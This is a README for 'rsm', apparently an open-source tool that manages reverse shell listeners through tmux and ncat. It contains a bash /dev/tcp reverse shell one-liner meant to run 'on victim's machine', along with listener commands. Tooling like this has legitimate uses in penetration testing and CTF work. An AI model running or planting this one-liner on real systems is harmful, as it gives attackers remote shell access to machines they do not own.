# rsm

A simple reverse shell manager using `tmux` and `ncat`.

## Quick Start

Listening on a port

```shell
git clone https://github.com/djosix/rsm.git
cd rsm

./rsm 11111
# You will attach to a tmux session called 'rsm-11111',
# where 11111 is your listening port.
```

On victim's machine, launch a reverse shell

```shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0<&1'
# Once connected to the listening port,
# the script will create a window in our tmux session.
# Just switch to that window and interact with the client.
```

Attaching to the last rsm session

```shell
./rsm attach
```

Stop the server and cleanup

```shell
./rsm stop
# Stop all rsm listeners
```

## Install

```shell
git clone --depth 1 https://github.com/djosix/rsm.git ~/.rsm
# Then add $HOME/.rsm to your PATH
```

## Usage

```shell
$ rsm help
Usage: rsm <COMMAND> [OPTIONS...]

    rsm <PORT>          Start a reverse shell listener on PORT
    rsm -d <PORT>       Start a detatched reverse shell listener on PORT
    rsm list            List active rsm listeners
    rsm info <PORT>     Show details of listener on PORT
    rsm info            Show details of all rsm listeners
    rsm stop <PORT>     Stop a rsm listener on PORT
    rsm stop            Stop all rsm listeners
    rsm attach <PORT>   Attach to a rsm session listening on PORT
    rsm attach          Attach to the last rsm session
    rsm clean <PORT>    Clean sockets for PORT
    rsm clean           Clean all sockets
    rsm help            Show this help message
```
